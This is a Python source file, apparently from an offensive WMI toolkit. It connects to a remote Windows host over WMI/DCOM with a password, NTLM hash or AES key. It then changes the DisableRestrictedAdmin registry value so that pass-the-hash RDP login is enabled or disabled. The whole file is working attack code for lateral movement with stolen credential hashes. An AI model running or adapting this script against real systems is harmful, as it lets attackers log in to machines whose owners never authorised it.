from module import *
from module import wmiconnect

def enable_pth_login_rdp(ip='', username='', password='',domain='',hashes='',aesKey='',isenable=0):
    if int(isenable)!=1 and int(isenable)!=0:
        print("[-] Pluse Query Help,Thanks....")
        exit()
    print("[*] Enable/disable pth login rdp")
    dcom,iWbemLevel1Login=wmiconnect.wmiconnect(ip,username,password,domain,hashes,aesKey)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
    StdRegProv, resp = iWbemServices.GetObject("StdRegProv")

    if int(isenable)==1:
        pth_open=StdRegProv.SetDWORDValue(2147483650,"System\\CurrentControlSet\\Control\\Lsa","DisableRestrictedAdmin",0)
        if pth_open.ReturnValue==0:
            print("[+] Enable PTH Rdp Login Sucess")
    else:
        pth_open = StdRegProv.DeleteValue(2147483650, "System\\CurrentControlSet\\Control\\Lsa","DisableRestrictedAdmin")
        if pth_open.ReturnValue == 0:
            print("[+] Disable PTH Rdp Login Sucess")
    dcom.disconnect()